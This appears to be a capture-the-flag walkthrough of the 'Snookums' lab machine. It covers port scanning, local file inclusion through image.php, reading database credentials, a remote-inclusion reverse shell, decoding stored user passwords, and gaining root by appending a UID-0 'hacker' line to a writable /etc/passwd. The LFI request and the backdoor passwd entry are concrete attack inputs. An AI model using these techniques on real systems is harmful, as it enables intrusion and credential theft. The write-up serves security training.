# Snookums
### Enumeration
```
# Nmap 7.92 scan initiated Mon Apr  4 17:34:11 2022 as: nmap -v -p- -sC -sV -oN tcp.out 192.168.55.58
Nmap scan report for 192.168.55.58
Host is up (0.00018s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.55.200
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx?
```

##### 139, 445
SMB didn't have anything interesting.

##### 21
Anonymous login was enabled for FTP, but all commands timed out.

##### 80
I fuzzed the webserver and found a few files:

```
db.php
functions.php
image.php
```

The first two were empty, so probably wouldn't take input, but the third was interesting. I fuzzed it for parameters and found `img`, which was vulnerable to LFI, e.g. I could get the contents of `/etc/passwd` by requesting:

```
http://192.168.55.58/image.php?img=/etc/passwd
```

I found the webroot at `/var/www/html` by requesting `?img=/var/www/html/index.php`. Since the server uses PHP, I used a php filter to fetch `db.php` as base64. After decoding, the contents was:

```php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
?>
```

However, we don't seem to be allowed to connect to MySQL and the password doesn't appear to be the root SSH password. I also tried these credentials with FTP and SMB but no luck there.

### Foothold
Instead, I fetched `image.php` itself and decoded to discover that the `img` parameter was being passed to `include()`. I spun up a python webserver and tried to RFI to it, which worked. So I could host a PHP reverse shell and get `image.php` to execute it for me. I had to use a port number that was open during the scan for the reverse shell (presumably the firewall was blocking outgoing requests to all other ports), so I went for 3306 and got a shell as the `apache` user.

### Privilege Escalation
There's one other user on the machine, called `michael`. I tried the database password with `su` for both `root` and `michael` but it didn't work for either. Instead, I connected to the database and retrieved the contents of the `users` table in the `SimplePHPGal` database:

```
mysql> select * from users;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
3 rows in set (0.01 sec)
```

These were twice base64 encode, and decoded to:

```
josh:MobilizeHissSeedtime747
michael:HockSydneyCertify123
serena:OverallCrestLean000
```

The password stored for `michael` worked as their password on the machine, so I was able to `su` to `michael` and get the user flag.

### Privilege Escalation 2
`michael` did not have `sudo` permissions.

Running linpeas, we see that the `michael` user owns `/etc/passwd`. I followed the instructions on [hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd) and added the following line to get a user with root permissions and credentials `hacker:hacker`:

```
hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash
```
#